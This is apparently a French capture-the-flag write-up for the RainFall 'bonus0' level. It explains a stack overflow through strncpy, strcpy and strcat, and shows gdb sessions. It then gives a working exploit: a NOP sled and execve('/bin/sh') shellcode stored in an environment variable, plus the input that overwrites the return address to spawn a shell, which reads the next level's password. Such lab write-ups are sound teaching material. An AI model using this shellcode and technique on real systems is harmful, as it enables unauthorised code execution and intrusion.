On remarque un strncpy qui prend en argument nos paramètres entrée, il se trouve que l'on peut faire en sorte de ne pas mettre de `\0` à la fin de notre buffer, en insérant une taille supèrieur aux buffer (20). L'on remarque également l'utilisation d'un strcpy et d'un strcat à l'aide de ces fonctions, on peut modifier l'adresse de retour du main. A partir de la dixième lettre de l'alphabet, on peut écrire sur cette fameuse adresse.

```bash
(gdb) cont
Continuing.
 - 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 - 
abcdefghjklnmopqrstuvwxy

Breakpoint 2, 0x08048598 in pp ()
(gdb) cont
Continuing.
aaaaaaaaaaaaaaaaaaaaabcdefghjklnmopqrstu��� abcdefghjklnmopqrstu���

Program received signal SIGSEGV, Segmentation fault.
0x6d6e6c6b in ?? () <- 6b = 'j'
```

On set une variable d'environement `S` où l'on insère des NOP suivis de notre shellcode.
Les NOP permettent de trouver plus facilement le shellcode.

```bash
bonus0@RainFall:~$ export S=$(python -c 'print "\x90" * 50 + "\x31\xC0\x31\xDB\x31\xD2\x31\xC9\xB0\x0B\x53\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x89\xE3\xCD\x80"')
```

Ensuite on cherche où est à peu près l'adresse de `S` afin de pouvoir rediriger à cette endroit pour executer le shellcode.

```bash
bonus0@RainFall:~$ gdb bonus0
...
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) b main
Breakpoint 1 at 0x80485a7
(gdb) r
Starting program: /home/user/bonus0/bonus0 
(gdb) x/250s $esp
...
0xbffffe54:	 "S=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300\061\333\061\322\061ɰ\vShn/shh//bi\211\343̀"
```

```bash
bonus0@RainFall:~$ (python -c 'print "a" * 42'; python -c 'print "1" * 9 + "\x74\xfe\xff\xbf" + "B" * 42'; cat) | ./bonus0 
 - 
 - 
aaaaaaaaaaaaaaaaaaaa111111111t���BBBBBBB��� 111111111t���BBBBBBB���
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
